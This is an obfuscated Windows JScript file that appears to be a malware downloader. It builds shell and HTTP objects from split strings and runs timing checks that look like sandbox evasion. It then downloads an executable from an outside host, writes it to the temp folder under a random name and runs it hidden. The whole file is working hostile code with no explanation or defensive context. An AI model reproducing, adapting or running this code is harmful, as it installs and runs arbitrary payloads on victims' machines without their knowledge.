var J = false;
var O1 = "Create"+"Object";
var V = function O() {return WScript[O1]("WScript"+".Shell");}(), M = 11;
var D0 = "MSXML2"+".XMLHTTP";
var KO = 2;
var JT = KO - 2;
function QW(ES){V["Run"](ES, JT, JT);};
function GN(){return D0 + "";};
function P(I0, XN){JT = JT * 1; return I0 - XN;};
function L(){return O1;};
/*@cc_on
  @if (@_win32 || @_win64)
    J = true;
  @end
@*/
if (J)
{
var E = "";
function Q(){return 22;};
var B = 0; var ZW = 0;
function BG()
{
var W0 = new this["Date"]();
var MM = W0["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var W0 = new this["Date"]();
var Z = W0["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var W0 = new this["Date"]();
var YG = W0["getUTCMilliseconds"]();
var B = "F";
B = P(Z, MM);
var ZW = "NG";
ZW = P(YG, Z);
E = "open";
return P(B, ZW);
}
var A = false;
var F0 = false;
for (var QE = JT; QE < Q() * 1; QE++){if (BG() != JT){
A = true; 
ZW = "31" + 11 * B + ZW; 
F0 = true; 
break;
}}
function CG() {return ((A == true) && (A == F0)) ? 1 : JT;};
if (A && CG() && F0){
function FJ() {return V["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "rmtXcKKVu4.ex" + "e";};
 P0 = GN();
 ZI = WScript[O1](P0);
 var O0 = 1;
do { 
	for (;O0;){
	try {
		if (O0 == 1)
		{
			ZI[E]("GET", "http://beimeihuifu.com/n7dja", false);
			ZI["send"]();
			I = "Sleep";
			O0 = 2;
		}
		WScript[I](Q() + 120); 
		if (ZI["readystate"] < 2 * 2) continue;
		O0 = JT;
		function W(G) {var R = (1, 2, 3, 4, 5, G); return R;};
		NK = WScript[L()]("ADODB.Stream");
		P0 = NK;
		P0[E]();
		P0["type"] = W(1);
		P0["write"](ZI["ResponseBody"]);
		NK["position"] = W(JT);
		P0["Save" + "ToFile"](FJ(), 2);
		NK["cl"+"ose"]();
		D = FJ();
		QW(D);
	} catch(KN){};};
}while (O0);
}
}

